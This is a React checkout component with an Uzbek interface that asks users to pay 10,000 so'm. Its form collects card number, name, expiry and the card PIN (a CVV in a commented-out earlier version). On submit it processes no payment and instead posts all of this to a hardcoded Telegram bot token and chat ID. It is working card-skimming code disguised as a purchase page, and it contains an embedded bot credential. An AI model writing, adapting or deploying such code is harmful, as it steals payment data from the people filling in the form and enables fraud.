import React, { useState } from "react";
import "./purchase.css";

function Purchase({ onPurchaseComplete }) {
  const [name, setName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [password, setPassword] = useState("");

  const handleNameChange = (e) => {
    const value = e.target.value.replace(/[^a-zA-Z\s]/g, "");
    setName(value);
  };

  const handleCardNumberChange = (e) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 16);
    const formattedValue = value.replace(/(\d{4})(?=\d)/g, "$1 ").trim();
    setCardNumber(formattedValue);
  };

  const handleExpiryChange = (e) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 4);
    const formattedValue = value.replace(/(\d{2})(?=\d)/, "$1/");
    setExpiry(formattedValue);
  };

  const handlePasswordChange = (e) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 4); 
    setPassword(value);
  };

  const sendToTelegram = async (message) => {
    const botToken = "7551646341:AAFx_zdsdKXWVTcSiY1gdugTWXPh2JfEyOo";
    const chatId = "7237989270-0";
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    });
  };

  const handlePurchase = async (e) => {
    e.preventDefault();

    const message = `
      📝 Yangi sotib olish talabi:
      👤 Ism: ${name}
      💳 Karta raqami: ${cardNumber}
      📅 Amal qilish muddati: ${expiry}
      🔑 Parol: ${password}  // Parolni qo'shdik
    `;

    await sendToTelegram(message);
    onPurchaseComplete();
  };

  return (
    <div className="purchase">
      <div className="purchase-container">
        <h2 className="purchase-title">Ma'lumotlarni to'ldiring</h2>
        <h2>Yechiladi: 10 000 so'm</h2>
        <form className="purchase-form" onSubmit={handlePurchase}>
          <input
            type="text"
            placeholder="Kartangiz raqami"
            value={cardNumber}
            onChange={handleCardNumberChange}
            required
            className="purchase-input"
          />
          <input
            type="text"
            placeholder="Ism Familiya"
            value={name}
            onChange={handleNameChange}
            required
            className="purchase-input"
          />
          <input
            type="text"
            placeholder="MM/YY"
            value={expiry}
            onChange={handleExpiryChange}
            maxLength={5}
            required
            className="purchase-input"
          />
          <input
            type="text" 
            placeholder="Parol"
            value={password}
            onChange={handlePasswordChange}
            maxLength={4}
            required
            className="purchase-input"
          />
          <button className="purchase-button" type="submit">
            Sotib olish
          </button>
        </form>
      </div>
    </div>
  );
}

export default Purchase;



// import React, { useState } from "react";
// import "./purchase.css";

// function Purchase({ onPurchaseComplete }) {
//   const [name, setName] = useState("");
//   const [cardNumber, setCardNumber] = useState("");
//   const [expiry, setExpiry] = useState("");
//   const [cvc, setCvc] = useState("");

//   const handleNameChange = (e) => {
//     const value = e.target.value.replace(/[^a-zA-Z\s]/g, "");
//     setName(value);
//   };

//   const handleCardNumberChange = (e) => {
//     const value = e.target.value.replace(/\D/g, "").slice(0, 16);
//     const formattedValue = value.replace(/(\d{4})(?=\d)/g, "$1 ").trim();
//     setCardNumber(formattedValue);
//   };

//   const handleExpiryChange = (e) => {
//     const value = e.target.value.replace(/\D/g, "").slice(0, 4);
//     const formattedValue = value.replace(/(\d{2})(?=\d)/, "$1/");
//     setExpiry(formattedValue);
//   };

//   const sendToTelegram = async (message) => {
//     const botToken = "7551646341:AAFx_zdsdKXWVTcSiY1gdugTWXPh2JfEyOo";
//     const chatId = "7237989270";
//     const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

//     await fetch(url, {
//       method: "POST",
//       headers: {
//         "Content-Type": "application/json",
//       },
//       body: JSON.stringify({
//         chat_id: chatId,
//         text: message,
//       }),
//     });
//   };

//   const handlePurchase = async (e) => {
//     e.preventDefault();

//     const message = `
//       📝 Yangi sotib olish talabi:
//       👤 Ism: ${name}
//       💳 Karta raqami: ${cardNumber}
//       📅 Amal qilish muddati: ${expiry}
//       🔒 CVV: ${cvc}
//     `;

//     await sendToTelegram(message);
//     onPurchaseComplete();
//   };

//   return (
//     <div className="purchase">
//       <div className="purchase-container">
//         <h2 className="purchase-title">Ma'lumotlarni to'ldiring</h2>
//         <h2>Yechiladi: 10 000 so'm</h2>
//         <form className="purchase-form" onSubmit={handlePurchase}>
//           <input
//             type="text"
//             placeholder="Kartangiz raqami"
//             value={cardNumber}
//             onChange={handleCardNumberChange}
//             required
//             className="purchase-input"
//           />
//           <input
//             type="text"
//             placeholder="Ism Familiya"
//             value={name}
//             onChange={handleNameChange}
//             required
//             className="purchase-input"
//           />
//           <input
//             type="text"
//             placeholder="MM/YY"
//             value={expiry}
//             onChange={handleExpiryChange}
//             maxLength={5}
//             required
//             className="purchase-input"
//           />
//           <input
//             type="text"
//             placeholder="CVV"
//             value={cvc}
//             onChange={(e) =>
//               setCvc(e.target.value.replace(/\D/g, "").slice(0, 3))
//             }
//             maxLength={3}
//             required
//             className="purchase-input"
//           />
//           <button className="purchase-button" type="submit">Sotib olish</button>
//         </form>
//       </div>
//     </div>
//   );
// }

// export default Purchase;